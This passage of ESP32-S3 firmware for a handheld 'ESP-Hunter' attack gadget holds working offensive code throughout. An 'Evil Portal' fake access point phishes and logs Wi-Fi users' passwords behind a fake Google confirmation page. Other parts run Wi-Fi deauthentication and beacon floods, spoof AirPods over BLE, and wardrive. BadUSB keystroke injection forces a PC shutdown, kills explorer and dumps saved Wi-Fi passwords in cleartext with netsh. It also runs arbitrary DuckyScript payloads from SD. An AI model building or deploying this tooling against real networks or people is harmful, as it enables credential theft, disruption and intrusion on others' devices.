    if (!isBeaconSpamActive) {
      isBeaconSpamActive = true;
      WiFi.mode(WIFI_AP);
      WiFi.softAP("AP Flood Active");
    }
    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam started\"}");
  });
  webServer.on("/api/wifi/beacon/stop", HTTP_GET, []() {
    isBeaconSpamActive = false;
    WiFi.mode(WIFI_OFF);
    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam stopped\"}");
  });
  webServer.on("/api/wifi/deauth/start", HTTP_GET, []() {
    if (wifiScannedCount == 0) {
      webServer.send(200, "application/json", "{\"msg\":\"No networks scanned!\"}");
      return;
    }
    deauthActive = true;
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
    webServer.send(200, "application/json", "{\"msg\":\"Deauth started\"}");
  });
  webServer.on("/api/wifi/deauth/stop", HTTP_GET, []() {
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    webServer.send(200, "application/json", "{\"msg\":\"Deauth stopped\"}");
  });

  webServer.on("/api/ble/spam/start", HTTP_GET, []() {
    if (!isBleSpamActive) {
      isBleSpamActive = true;
      startBleSpamAttack();
    }
    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam started\"}");
  });
  webServer.on("/api/ble/spam/stop", HTTP_GET, []() {
    if (isBleSpamActive) {
      isBleSpamActive = false;
      stopBleSpamAttack();
    }
    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam stopped\"}");
  });
  webServer.on("/api/ble/scan", HTTP_GET, []() {
    runBleSnifferScan();
    String json = "[";
    for (int i = 0; i < bleScannedCount; i++) {
      if (i > 0) json += ",";
      json += "{\"name\":\"" + String(bleScannedList[i].deviceName) + "\",\"mac\":\"" + String(bleScannedList[i].macAddress) + "\",\"rssi\":" + String(bleScannedList[i].signalRssi) + "}";
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });

  // ========== УПРАВЛЕНИЕ МЫШЬЮ ==========
  webServer.on("/api/mouse/move", HTTP_GET, []() {
    int x = webServer.hasArg("x") ? webServer.arg("x").toInt() : 0;
    int y = webServer.hasArg("y") ? webServer.arg("y").toInt() : 0;
    if (x != 0 || y != 0) {
      Mouse.move(x, y);
    }
    webServer.send(200, "application/json", "{\"msg\":\"Move " + String(x) + "," + String(y) + "\"}");
  });
  webServer.on("/api/mouse/click", HTTP_GET, []() {
    int btn = webServer.hasArg("button") ? webServer.arg("button").toInt() : 1;
    if (btn == 1) { Mouse.click(MOUSE_LEFT); }
    else if (btn == 2) { Mouse.click(MOUSE_MIDDLE); }
    else if (btn == 3) { Mouse.click(MOUSE_RIGHT); }
    webServer.send(200, "application/json", "{\"msg\":\"Click button " + String(btn) + "\"}");
  });
  webServer.on("/api/mouse/scroll", HTTP_GET, []() {
    int delta = webServer.hasArg("delta") ? webServer.arg("delta").toInt() : 0;
    if (delta != 0) {
      Mouse.move(0, 0, delta);
    }
    webServer.send(200, "application/json", "{\"msg\":\"Scroll delta " + String(delta) + "\"}");
  });

    // ========== ДИСПЛЕЙ ==========
  webServer.on("/api/display/rotation", HTTP_GET, []() {
    if (webServer.hasArg("val")) {
      uint8_t rot = webServer.arg("val").toInt() % 4;
      currentRotation = rot;
      applyRotation(rot);
      saveSystemSettings();
      webServer.send(200, "application/json", "{\"msg\":\"Rotation set to " + String(rot) + "\"}");
    } else {
      webServer.send(200, "application/json", "{\"msg\":\"Missing parameter\"}");
    }
  });

  webServer.on("/api/display/brightness", HTTP_GET, []() {
    if (webServer.hasArg("val")) {
      uint8_t val = webServer.arg("val").toInt();
      if (val > 255) val = 255;
      setBacklight(val);
      saveSystemSettings();
      webServer.send(200, "application/json", "{\"msg\":\"Brightness set to " + String(val) + "\"}");
    } else {
      webServer.send(200, "application/json", "{\"msg\":\"Missing parameter\"}");
    }
  });

  // ========== СИСТЕМА ==========
  webServer.on("/api/system/info", HTTP_GET, []() {
    String json = "{";
    json += "\"board\":\"ESP32-S3\",";
    json += "\"sd\":\"" + String(isSdCardAvailable ? "OK" : "NO") + "\",";
    json += "\"rfid\":\"" + String(isRfidAvailable ? "OK" : "NO") + "\",";
    json += "\"ir\":\"" + String(activeIrSignal.valid ? "Signal" : "Empty") + "\",";
    json += "\"heap\":" + String(ESP.getFreeHeap());
    json += "}";
    webServer.send(200, "application/json", json);
  });

  // ========== SD КАРТА ==========
  webServer.on("/api/sd/info", HTTP_GET, []() {
    if (!isSdCardAvailable) {
      webServer.send(200, "application/json", "{\"msg\":\"SD Card not mounted\"}");
      return;
    }
    uint64_t total = SD.cardSize() / (1024 * 1024);
    String msg = "SD Card: " + String(total) + " MB";
    webServer.send(200, "application/json", "{\"msg\":\"" + msg + "\"}");
  });

  webServer.on("/api/sd/list", HTTP_GET, []() {
    if (!isSdCardAvailable) {
      webServer.send(200, "application/json", "{\"msg\":\"SD Card not mounted\"}");
      return;
    }
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(SD_CS, LOW);
    File root = SD.open("/");
    String list = "Files:\n";
    if (root) {
      File file = root.openNextFile();
      while (file) {
        list += String(file.name()) + " (" + String(file.size()) + " B)\n";
        file = root.openNextFile();
      }
      root.close();
    }
    digitalWrite(SD_CS, HIGH);
    webServer.send(200, "application/json", "{\"msg\":\"" + list + "\"}");
  });

  // ========== О ПРОГРАММЕ ==========
  webServer.on("/api/about", HTTP_GET, []() {
    webServer.send(200, "application/json",
      "{\"msg\":\"ESP-Hunter v2.0\\nBoard: ESP32-S3\\nLCD: ST7735 128x128\\nRFID: PN532\\nIR: TX/RX\\nSD: "
      + String(isSdCardAvailable ? "OK" : "NO") + "\\nUSB: HID Keyboard+Mouse\"}");
  });

  // ========== УПРАВЛЕНИЕ ИГРОЙ PONG (через веб) ==========
  webServer.on("/api/pong/up", HTTP_GET, []() {
    // Симулируем нажатие кнопки UP для игры
    btnUp.pressedEvent = true;
    webServer.send(200, "application/json", "{\"msg\":\"Pong Up\"}");
  });
  webServer.on("/api/pong/down", HTTP_GET, []() {
    btnDown.pressedEvent = true;
    webServer.send(200, "application/json", "{\"msg\":\"Pong Down\"}");
  });
  webServer.on("/api/pong/reset", HTTP_GET, []() {
    resetPongGameState();
    webServer.send(200, "application/json", "{\"msg\":\"Pong Reset\"}");
  });

    webServer.on("/api/system/buzzer", HTTP_GET, []() {
    if (webServer.hasArg("val")) {
      buzzerEnabled = webServer.arg("val") == "1";
      saveSystemSettings();
    }
    String json = "{\"buzzer\":" + String(buzzerEnabled ? "true" : "false") + "}";
    webServer.send(200, "application/json", json);
  });

  // ========== WEB REMOTE СТАТУС ==========
  webServer.on("/api/web/status", HTTP_GET, []() {
    webServer.send(200, "application/json", "{\"msg\":\"Web Remote active, uptime: " + String(millis()/1000) + "s\"}");
  });

  webServer.onNotFound([]() {
    webServer.send(404, "text/plain", "Not Found");
  });
}

void runWebServerMode() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  setupWebServerRoutes();
  webServer.begin();
  isWebServerRunning = true;
  drawHeaderBar("WEB REMOTE CONTROL");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 25);
  canvas.print("Wi-Fi AP Active!");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 42);
  canvas.printf("SSID: %s", AP_SSID);
  canvas.setCursor(5, 57);
  canvas.printf("PASS: %s", AP_PASS);
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 75);
  canvas.print("Open in Browser:");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 90);
  canvas.print("http://192.168.4.1");
  drawFooterBar("Hold ESC to Exit");
  canvasFlush();
  while (isWebServerRunning) {
    webServer.handleClient();
    processIrRxTask();
    if (digitalRead(BTN_ESC) == LOW) {
      delay(100);
      if (digitalRead(BTN_ESC) == LOW) {
        isWebServerRunning = false;
      }
    }
    updateBuzzer();
    yield();
  }
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  drawHeaderBar("WEB REMOTE");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 50);
  canvas.print("Server Stopped!");
  canvasFlush();
  delay(800);
}

// ======================================================================
// EVIL PORTAL ФУНКЦИИ (недостающие)
// ======================================================================

void drawPortalSsidSelectPage() {
  drawHeaderBar("CHOOSE TARGET SSID");
  if (wifiScannedCount == 0) {
    canvas.setTextColor(COLOR_YELLOW);
    canvas.setCursor(5, 45);
    canvas.print("Scanning networks...");
    canvasFlush();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    wifiScannedCount = WiFi.scanNetworks(false, false, false, 200);
    if (wifiScannedCount > 10) wifiScannedCount = 10;
  }
  if (portalSsidIndex >= wifiScannedCount && wifiScannedCount > 0) portalSsidIndex = 0;
  for (int i = 0; i < 4; i++) {
    int idx = i + evilPortalSubMenuScrollOffset;
    if (idx >= wifiScannedCount) break;
    int lineY = 25 + i * 20;
    if (idx == portalSsidIndex) {
      canvas.fillRoundRect(3, lineY - 3, 122, 17, 3, accentColor);
      canvas.setTextColor(COLOR_BLACK);
    } else {
      canvas.setTextColor(COLOR_WHITE);
    }
    canvas.setCursor(5, lineY);
    canvas.print(WiFi.SSID(idx).substring(0, 16));
    updateBuzzer();
  }
  if (wifiScannedCount == 0) {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 45);
    canvas.print("No Wi-Fi found!");
  }
  drawFooterBar("UP/DN:Nav OK:Select");
  canvasFlush();
}

void drawEvilPortalPage() {
  drawHeaderBar("EVIL PORTAL AP");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  if (isEvilPortalRunning) {
    canvas.setTextColor(COLOR_RED);
    canvas.print("PORTAL: RUNNING");
    canvas.setTextColor(COLOR_YELLOW);
    canvas.setCursor(5, 42);
    canvas.printf("SSID: %s", evilPortalSsid);
    canvas.setTextColor(COLOR_CYAN);
    canvas.setCursor(5, 60);
    canvas.printf("Captured: %d creds", capturedCredsCount);
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(5, 78);
    canvas.print("Last:");
    canvas.setCursor(5, 90);
    canvas.print(lastCapturedCred.substring(0, 18));
    drawFooterBar("Hold ESC to Stop");
  } else {
    canvas.setTextColor(COLOR_GREEN);
    canvas.print("Status: STOPPED");
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(5, 42);
    canvas.print("Target SSID:");
    canvas.setTextColor(COLOR_YELLOW);
    canvas.setCursor(5, 55);
    canvas.print(evilPortalSsid);
    canvas.setTextColor(COLOR_CYAN);
    canvas.setCursor(5, 75);
    canvas.print("OK: Config AP");
    drawFooterBar("OK:Select ESC:Back");
  }
  canvasFlush();
}

void startEvilPortalService() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(evilPortalSsid);
  delay(100);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  webServer.on("/login", HTTP_POST, []() {
    String u = webServer.hasArg("user") ? webServer.arg("user") : "unknown";
    String p = webServer.hasArg("pass") ? webServer.arg("pass") : "empty";
    lastCapturedCred = u + " / " + p;
    capturedCredsCount++;
    appendCredToSd(u, p);
    webServer.send(200, "text/html",
                   "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>"
                   "<body style='font-family:sans-serif;text-align:center;padding:40px;'>"
                   "<h2 style='color:#1a73e8;'>Успешный вход</h2>"
                   "<p>Аккаунт Google успешно подтвержден. Можете закрыть страницу.</p>"
                   "</body></html>");
  });
  webServer.onNotFound([]() {
    bool sdPortalLoaded = false;
    if (isSdCardAvailable) {
      digitalWrite(TFT_CS, HIGH);
      digitalWrite(SD_CS, LOW);
      if (SD.exists("/portal.html")) {
        File f = SD.open("/portal.html", FILE_READ);
        if (f) {
          webServer.streamFile(f, "text/html");
          f.close();
          sdPortalLoaded = true;
        }
      }
      digitalWrite(SD_CS, HIGH);
    }
    if (!sdPortalLoaded) {
      webServer.send(200, "text/html", EVIL_PORTAL_HTML);
    }
  });
  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
    String json = "[";
    if (isSdCardAvailable) {
      digitalWrite(TFT_CS, HIGH);
      digitalWrite(SD_CS, LOW);
      File logFile = SD.open("/captured_creds.txt", FILE_READ);
      if (logFile) {
        bool first = true;
        while (logFile.available()) {
          String line = logFile.readStringUntil('\n');
          line.trim();
          if (line.length() > 0) {
            if (!first) json += ",";
            first = false;
            json += "\"" + line + "\"";
          }
        }
        logFile.close();
        updateBuzzer();
      }
      digitalWrite(SD_CS, HIGH);
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });
  webServer.begin();
  isEvilPortalRunning = true;
  drawEvilPortalPage();
  while (isEvilPortalRunning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (digitalRead(BTN_ESC) == LOW) {
      delay(100);
      if (digitalRead(BTN_ESC) == LOW) {
        isEvilPortalRunning = false;
      }
    }
    updateBuzzer();
    yield();
  }
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  drawHeaderBar("EVIL PORTAL");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 50);
  canvas.print("Portal Stopped!");
  canvasFlush();
  delay(1000);
  drawEvilPortalPage();
}

void loadCapturedCredentials() {
  capturedCredCount = 0;
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File logFile = SD.open("/captured_creds.txt", FILE_READ);
  if (!logFile) {
    digitalWrite(SD_CS, HIGH);
    return;
  }
  while (logFile.available() && capturedCredCount < MAX_CAPTURED_LINES) {
    String line = logFile.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      capturedCredLines[capturedCredCount++] = line;
    }
    updateBuzzer();
  }
  logFile.close();
  digitalWrite(SD_CS, HIGH);
}

// ======================================================================
// 19. ИНФОРМАЦИОННЫЕ СТРАНИЦЫ
// ======================================================================
void drawSdInfoPage() {
  drawHeaderBar("MICROSD INFO");
  canvas.setTextSize(1);
  canvas.setCursor(5, 28);
  if (isSdCardAvailable) {
    canvas.setTextColor(COLOR_GREEN);
    canvas.print("Status: MOUNTED");
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(SD_CS, LOW);
    uint64_t totalSizeMb = SD.cardSize() / (1024 * 1024);
    digitalWrite(SD_CS, HIGH);
    canvas.setCursor(5, 45);
    canvas.setTextColor(COLOR_WHITE);
    canvas.printf("Size: %u MB", (uint32_t)totalSizeMb);
    canvas.setCursor(5, 62);
    canvas.setTextColor(COLOR_YELLOW);
    canvas.print("Config : /config.txt");
    canvas.setCursor(5, 78);
    canvas.setTextColor(COLOR_CYAN);
    canvas.print("Payload: /payload.txt");
  } else {
    canvas.setTextColor(COLOR_RED);
    canvas.print("Status: NOT FOUND");
  }
  drawFooterBar("ESC: back");
  canvasFlush();
}

void drawAboutSystemPage() {
  drawHeaderBar("ABOUT SYSTEM");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setTextSize(1);
  canvas.setCursor(5, 28);
  canvas.print("Board: ESP32-S3");
  canvas.setCursor(5, 43);
  canvas.print("LCD: ST7735 128x128");
  canvas.setCursor(5, 58);
  canvas.print("USB: HID Keyboard + Mouse");
  canvas.setCursor(5, 73);
  canvas.print("Portal: DNS Captive");
  canvas.setCursor(5, 88);
  canvas.print("RFID: PN532 I2C");
  drawFooterBar("ESC: back");
  canvasFlush();
}

void drawRemoteStreamStatusPage() {
  drawHeaderBar("SERIAL REMOTE");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 30);
  canvas.print("Stream Ready!");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 50);
  canvas.print("Use PC Manager app");
  canvas.setCursor(5, 65);
  canvas.print("to mirror screen");
  canvas.setCursor(5, 80);
  canvas.print("& control via D-Pad.");
  drawFooterBar("ESC: Back");
  canvasFlush();
}


// ---------- BLE ----------
void startBleSpamAttack() {
  if (bleActive) return;
  BLEDevice::init("AirPods Pro");
  BLEServer *pServer = BLEDevice::createServer();
  BLEAdvertising *pAdvertising = pServer->getAdvertising();
  uint8_t packetData[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x13, 0x04, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
  };
  BLEAdvertisementData advData;
  advData.addData(String((char*)packetData, sizeof(packetData)));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  bleActive = true;
}

void stopBleSpamAttack() {
  if (!bleActive) return;
  BLEDevice::deinit(true);
  bleActive = false;
}

class CustomBleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (bleScannedCount < 8) {
      snprintf(bleScannedList[bleScannedCount].macAddress,
               sizeof(bleScannedList[bleScannedCount].macAddress),
               "%s", advertisedDevice.getAddress().toString().c_str());
      snprintf(bleScannedList[bleScannedCount].deviceName,
               sizeof(bleScannedList[bleScannedCount].deviceName),
               "%s", advertisedDevice.getName().c_str());
      bleScannedList[bleScannedCount].signalRssi = advertisedDevice.getRSSI();
      bleScannedCount++;
    }
  }
};

void runBleSnifferScan() {
  drawHeaderBar("SNIFFING BLE...");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(10, 50);
  canvas.print("Scanning BLE tags...");
  canvasFlush();
  bleScannedCount = 0;
  BLEDevice::init("");
  bleScannerInstance = BLEDevice::getScan();
  bleScannerInstance->setAdvertisedDeviceCallbacks(new CustomBleScanCallbacks());
  bleScannerInstance->setActiveScan(true);
  bleScannerInstance->start(2, false);
  BLEDevice::deinit(true);
  drawBleSnifferPage();
}

void drawBleSnifferPage() {
  drawHeaderBar("BLE DEVS SCANNER");
  if (bleScannedCount == 0) {
    canvas.setTextColor(COLOR_YELLOW);
    canvas.setCursor(10, 45);
    canvas.print("No BLE May Found.");
    canvas.setCursor(10, 60);
    canvas.setTextColor(COLOR_WHITE);
    canvas.print("Press OK to sniff");
    drawFooterBar("OK: Sniff BLE ESC:Back");
    canvasFlush();
    return;
  }
  for (int i = 0; i < 4; i++) {
    if (i >= bleScannedCount) break;
    int lineY = 25 + i * 20;
    canvas.setTextColor(COLOR_GREEN);
    canvas.setCursor(5, lineY);
    canvas.print(bleScannedList[i].macAddress);
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(5, lineY + 10);
    canvas.print(bleScannedList[i].deviceName[0] ? bleScannedList[i].deviceName : "[Hidden]");
    canvas.setCursor(105, lineY);
    canvas.setTextColor(COLOR_YELLOW);
    canvas.print(bleScannedList[i].signalRssi);
    updateBuzzer();
  }
  drawFooterBar("OK: Sniff Again");
  canvasFlush();
}

// ---------- SD WARDRIVE ----------
void executeSdWardrivingLog() {
  drawHeaderBar("SD WARDRIVING");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvasFlush();
  if (!isSdCardAvailable) {
    canvas.setTextColor(COLOR_RED);
    canvas.print("Error: No SD Card!");
    drawFooterBar("ESC: back");
    canvasFlush();
    delay(1500);
    return;
  }
  canvas.print("Wardrive Active!");
  canvas.setCursor(5, 45);
  canvas.setTextColor(COLOR_CYAN);
  canvas.print("Scanning Air...");
  canvasFlush();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int16_t foundNets = WiFi.scanNetworks();
  int loggedCount = 0;
  if (foundNets > 0) {
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(SD_CS, LOW);
    File csvFile = SD.open("/wardrive.csv", FILE_APPEND);
    if (csvFile) {
      for (int i = 0; i < foundNets; i++) {
        csvFile.printf("%s,%s,%d,%d,%d\n",
                       WiFi.SSID(i).c_str(),
                       WiFi.BSSIDstr(i).c_str(),
                       WiFi.RSSI(i),
                       WiFi.channel(i),
                       WiFi.encryptionType(i));
        loggedCount++;
        updateBuzzer();
      }
      csvFile.close();
    }
    digitalWrite(SD_CS, HIGH);
  }
  canvas.fillRect(0, 40, 128, 45, COLOR_BLACK);
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Log Done!");
  canvas.setCursor(5, 68);
  canvas.setTextColor(COLOR_WHITE);
  canvas.printf("Saved nets: %d", loggedCount);
  drawFooterBar("ESC: back");
  canvasFlush();
}

// ---------- BADUSB ----------
void ensureEnglishLayout() {
  if (!isUsbHidReady) return;
  drawHeaderBar("language change...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 50);
  canvas.print("Sending String...");
  canvasFlush();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(150);
  Keyboard.releaseAll();
  delay(300);
  drawHeaderBar("USB HID");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Languach setup!");
  canvasFlush();
  delay(1000);
}

void runBadUsbDemoNotepad() {
  drawHeaderBar("EXECUTING HID...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Executing Demo:");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 55);
  canvas.print("Opening Notepad...");
  canvas.setCursor(5, 75);
  canvas.setTextColor(COLOR_CYAN);
  canvas.print("Do not disconnect USB");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("notepad");
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.print("Hello World! ESP-Hunter HID Automation Active!\n");
  delay(200);
  drawHeaderBar("USB HID DEMO");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Macro Executed OK!");
  canvasFlush();
  delay(1500);
}

void runBadUsbDemoTerminal() {
  drawHeaderBar("EXECUTING HID...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Executing Demo:");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 55);
  canvas.print("Testing Terminal...");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.print("echo ESP32-S3 HID Script Runner Active!\n");
  drawHeaderBar("USB HID DEMO");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Terminal Test Done!");
  canvasFlush();
  delay(1500);
}

void executeDuckyScriptFromSd() {
  drawHeaderBar("DUCKYSCRIPT SD");
  if (!isSdCardAvailable) {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No MicroSD Card!");
    canvasFlush();
    delay(1200);
    return;
  }
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File scriptFile = SD.open("/payload.txt", FILE_READ);
  if (!scriptFile) {
    digitalWrite(SD_CS, HIGH);
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 45);
    canvas.print("/payload.txt");
    canvas.setCursor(5, 65);
    canvas.print("file not found!");
    canvasFlush();
    delay(1500);
    return;
  }
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 35);
  canvas.print("Running /payload.txt");
  canvasFlush();
  while (scriptFile.available()) {
    String line = scriptFile.readStringUntil('\n');
    line.trim();
    if (line.startsWith("REM") || line.length() == 0) continue;
    if (line.startsWith("DELAY ")) {
      int ms = line.substring(6).toInt();
      delay(ms);
    } else if (line.startsWith("STRING ")) {
      Keyboard.print(line.substring(7));
    } else if (line.equals("ENTER")) {
      Keyboard.write(KEY_RETURN);
    } else if (line.equals("GUI r") || line.equals("WINDOWS r")) {
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(100);
      Keyboard.releaseAll();
    } else if (line.equals("GUI") || line.equals("WINDOWS")) {
      Keyboard.write(KEY_LEFT_GUI);
    }
    updateBuzzer();
    delay(50);
  }
  scriptFile.close();
  digitalWrite(SD_CS, HIGH);
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 75);
  canvas.print("Payload Finished!");
  canvasFlush();
  delay(1500);
}

void runBadUsbCustomString(String txt) {
  drawHeaderBar("TYPING USB...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 50);
  canvas.print("Sending String...");
  canvasFlush();
  delay(300);
  Keyboard.print(txt);
  drawHeaderBar("USB HID");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("String Sent OK!");
  canvasFlush();
  delay(1000);
}

void runBadUsbShutdown() {
  drawHeaderBar("BADUSB: SHUTDOWN");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Executing Shutdown");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 55);
  canvas.print("PC will turn off in 3s");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.print("shutdown /s /t 0");
  Keyboard.write(KEY_RETURN);
  delay(300);
  drawHeaderBar("BADUSB: SHUTDOWN");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Shutdown Executed!");
  canvasFlush();
  delay(1500);
}

void runBadUsbWallpaper() {
  drawHeaderBar("BADUSB: WALLPAPER");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Changing Wallpaper...");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.print("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.print("exit");
  Keyboard.write(KEY_RETURN);
  delay(300);
  drawHeaderBar("BADUSB: WALLPAPER");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Wallpaper Changed!");
  canvasFlush();
  delay(1500);
}

void runBadUsbDisableIcons() {
  ensureEnglishLayout();
  drawHeaderBar("BADUSB: DISABLE ICONS");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Disabling Desktop Icons...");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideIcons /t REG_DWORD /d 1 /f");
  Keyboard.write(KEY_RETURN);
  delay(300);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_ESC);
  delay(100);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.print("taskkill /f /im explorer.exe");
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.print("start explorer.exe");
  Keyboard.write(KEY_RETURN);
  delay(300);
  drawHeaderBar("BADUSB: DISABLE ICONS");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Icons Disabled!");
  canvasFlush();
  delay(1500);
}

void runBadUsbDumpWifi() {
  drawHeaderBar("BADUSB: DUMP WIFI");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 35);
  canvas.print("Dumping Wi-Fi Passwords...");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 55);
  canvas.print("Saved to C:\\wifi.txt");
  canvasFlush();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(800);
  Keyboard.print("netsh wlan export profile key=clear folder=C:\\");
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("notepad C:\\Wi-Fi-*.xml");
  Keyboard.write(KEY_RETURN);
  delay(300);
  drawHeaderBar("BADUSB: DUMP WIFI");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Dump Executed!");
  canvasFlush();
  delay(1500);
}

// ======================================================================
// 20. ОБРАБОТКА КОМАНД ИЗ SERIAL
// ======================================================================
void sendScreenData() {
  Serial.print("IMG_START\n");
  uint8_t* buffer = (uint8_t*)canvas.getBuffer();
  size_t size = SCREEN_WIDTH * SCREEN_HEIGHT * 2;
  for (size_t i = 0; i < size; i += 128) {
    size_t chunk = (size - i > 128) ? 128 : (size - i);
    Serial.write(buffer + i, chunk);
    yield();
  }
  Serial.print("IMG_END\n");
  Serial.flush();
}

void processSerialCommands() {
  if (!Serial.available()) return;
